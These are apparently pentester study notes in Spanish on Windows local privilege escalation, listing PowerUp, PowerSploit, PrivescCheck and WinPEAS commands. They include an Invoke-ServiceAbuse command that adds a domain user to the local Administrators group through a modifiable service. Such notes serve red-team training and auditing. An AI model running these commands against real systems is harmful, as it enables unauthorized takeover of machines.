# Local Privilege Escalation (Enumeración)

Tags: #AD #Windows #Powershell #PrivEsc #PowerUp #WinPeas #PowerSploit 

## PowerUP

* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

```powershell
❯ . C:\AD\PowerUp.ps1    # Cargar la tool 

❯ Invoke-Allchecks       # Ejecutar todas las comprobaciones de escalación local del script
```

```powershell 
❯ Get-ServiceUnquoted -Verbose          # Obtener servicios con rutas entre comillas y un espacio en sus nombres 
❯ Get-ModifiableServiceFile -Verbose    # Obtener servicios donde el usuario actual puede escribir en su ruta binaria o cambiar los argumentos del binario 
❯ Get-ModifiableService -Verbose        # Obtener los servicios cuya configuración puede modificar el usuario actual 
```
### PowerUp - privEsc local (Forma 1) 
```powershell
# Si se encuentra un servicio corriendo en el escaneo de PowerUp y tiene estas características (AbuseFunction, CanRestart y Check) de la siguiente manera, se podría abusar para escalar privilegios:

	ServiceName:  
	Path: 
	StartName: 
	AbuseFunction: Invoke-ServiceAbuse -Name 'ServiceName'
	CanRestart: True
	Name: 
	Check: Modifiable Services 


❯ help Invoke-ServiceAbuse      # Mirar ejemplos de los diferentes comandos
	# Agregar al usuario actual del dominio al grupo de administrador local  
	❯ Invoke-ServiceAbuse -Name 'ServiceName' -Username "domain\user" -Verbose
	❯ net localgroup Administrators  # Mirar el grupo local administrators


Nota: 
	- Despues de agregar el usuario al grupo se debe salir y volver a iniciar sesión
```
## PowerSploit - Recon servers DC

```powershell 
❯ . Find-PSRemotingLocalAdminAccess.ps1       # Importar el módulo 
❯ Find-PSRemotingLocalAdminAccess -Verbose    # Listar servidores del DC donde se tiene acceso administrativo local 
```

## Privesc 

* [Privesc](https://github.com/itm4n/PrivescCheck)

```powershell 
# Es similar a PowerUp, pero más moderno y más detallado en auditoría

❯ Invoke-PrivEscCheck 
```

## WinPEAS 

* [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

```powershell 
# Es un binario compilado en C#

❯ winPEASx64.exe    
```